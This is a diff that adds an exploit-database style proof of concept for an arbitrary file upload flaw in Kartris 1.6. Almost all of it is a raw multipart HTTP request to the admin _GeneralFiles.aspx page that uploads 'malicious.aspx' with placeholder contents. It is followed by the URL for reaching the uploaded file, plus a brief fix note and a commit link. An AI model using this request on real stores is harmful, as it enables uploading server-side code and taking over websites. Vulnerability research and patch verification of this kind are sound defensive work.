@@ -1,0 +1,111 @@
+# Exploit Title: Kartris 1.6 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2020-05-08
+# Exploit Author: Nhat Ha - Sun CSR
+# Vendor Homepage: https://www.cactusoft.com/
+# Software Link: https://www.kartris.com/
+# Version: 1.6
+# Category: Webapps
+# Tested on: WiN10_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: https://localhost/Admin/_GeneralFiles.aspx
+#
+POST /Admin/_GeneralFiles.aspx HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101
+Firefox/76.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;
+boundary=---------------------------9604487443072642880454762058
+Content-Length: 18484
+Origin: 192.168.1.1
+Connection: close
+Referer: https://192.168.1.1/Admin/_GeneralFiles.aspx
+Cookie: __cfduid=d1e56d596943226c869a1186e06b8d8661588757096;
+ASP.NET_SessionId=abbnm4jh04wmdbl2gukr5t5w;
+KartrisBasket870c8=s=7i7lpj21819; KartrisBackAuth870c8=xxxxxxxxxxxxx
+Upgrade-Insecure-Requests: 1
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="scrManager_HiddenField"
+
+;;AjaxControlToolkit, Version=4.1.7.123, Culture=neutral,
+PublicKeyToken=28f01b0e84b6d53e:en-GB:57898466-f347-4e5c-9527-24f201596811:475a4ef5:5546a2b:d2e10b12:effe2a26:37e2e5c9:1d3ed089:751cdd15:dfad98a5:497ef277:a43b07eb:3cf12cf1;
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data;
+name="_UC_CategoryMenu_tvwCategory_ExpandState"
+
+cccccccccc
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data;
+name="_UC_CategoryMenu_tvwCategory_SelectedNode"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data;
+name="_UC_CategoryMenu_tvwCategory_PopulateLog"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$scrManager"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$_UC_AdminSearch$txtSearch"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$phdMain$hidFileNameToDelete"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$phdMain$filUploader";
+filename="malicious.aspx"
+Content-Type: text/plain
+
+[Content Malicious File Here ! ]
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$splMainPage$hdnWidth"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$splMainPage$hdnMinWidth"
+
+170px
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="ctl00$splMainPage$hdnMaxWidth"
+
+500px
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="__EVENTTARGET"
+
+ctl00$phdMain$lnkUpload
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="__VIEWSTATE"
+
+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
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+54DD7DF0
+-----------------------------9604487443072642880454762058
+Content-Disposition: form-data; name="__VIEWSTATEENCRYPTED"
+
+
+-----------------------------9604487443072642880454762058--
+
+
+# Access malicious file following the link:
+https://localhost/uploads/General/malicious.aspx
+# How to fix: Update the latest version
+# Commit fix:
+https://github.com/cactusoft/kartris/commit/e9450dc1f90aa6167f1db1a6f137ea07cacb2a5c
